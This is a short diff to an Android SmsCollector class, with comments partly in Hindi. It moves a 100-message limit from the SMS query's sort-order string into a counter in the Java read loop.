@@ -38,7 +38,7 @@ public class SmsCollector {
                 null,
                 null,
                 null,
-                Telephony.Sms.DATE + " DESC LIMIT 100"
+                Telephony.Sms.DATE + " DESC"   // ✅ LIMIT हटा दिया
         );
 
         if (cursor != null) {
@@ -47,7 +47,8 @@ public class SmsCollector {
             int dateIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
             int typeIndex = cursor.getColumnIndex(Telephony.Sms.TYPE);
 
-            while (cursor.moveToNext()) {
+            int count = 0;
+            while (cursor.moveToNext() && count < 100) {  // ✅ Java me limit
                 Map<String, Object> sms = new HashMap<>();
 
                 if (addressIndex != -1) {
@@ -74,6 +75,7 @@ public class SmsCollector {
                 }
 
                 smsList.add(sms);
+                count++;
             }
             cursor.close();
         }
